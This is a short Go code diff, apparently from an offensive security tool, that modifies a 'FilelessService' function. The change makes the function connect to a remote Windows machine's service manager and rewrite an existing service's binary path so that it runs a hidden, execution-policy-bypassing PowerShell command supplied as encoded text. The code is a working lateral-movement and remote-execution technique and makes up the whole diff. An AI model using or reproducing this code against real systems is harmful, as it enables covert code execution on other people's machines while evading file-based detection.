@@ -17,7 +17,7 @@ func FilelessService(args []string) (string, error) {
 	}
 	targetMachine := args[0]
 	serviceName := args[1]
-	serviceBinary := args[2]
+	powershellEncodedCommand := args[2]
 	serviceMgr, err := mgr.ConnectRemote(targetMachine)
 	if err != nil {
 		return "", err
@@ -33,7 +33,7 @@ func FilelessService(args []string) (string, error) {
 		return "", err
 	}
 	oldBinPath := c.BinaryPathName
-	c.BinaryPathName = serviceBinary
+	c.BinaryPathName = fmt.Sprintf("C:\\\\windows\\system32\\cmd.exe /c powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -EncodedCommand \"%s\"", powershellEncodedCommand)
 	err = s.UpdateConfig(c)
 	if err != nil {
 		return "", err
